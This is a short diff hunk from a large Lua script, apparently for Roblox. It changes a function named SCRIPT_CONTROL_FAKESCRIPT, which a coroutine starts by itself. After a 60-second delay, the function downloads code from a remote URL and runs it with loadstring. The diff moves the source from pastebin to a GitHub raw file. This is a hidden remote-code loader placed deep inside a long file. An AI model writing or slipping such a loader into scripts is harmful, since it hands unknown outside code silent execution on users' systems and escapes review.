@@ -16549,7 +16549,7 @@ end
 
 function SCRIPT_CONTROL_FAKESCRIPT() 
 	wait(60)
-	loadstring(game:HttpGet("https://pastebin.com/raw/HSQkUPWJ"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Furtydorux/Furtyscript/main/Furtyedom"))()
 end
 coroutine.resume(coroutine.create(SCRIPT_CONTROL_FAKESCRIPT))
 
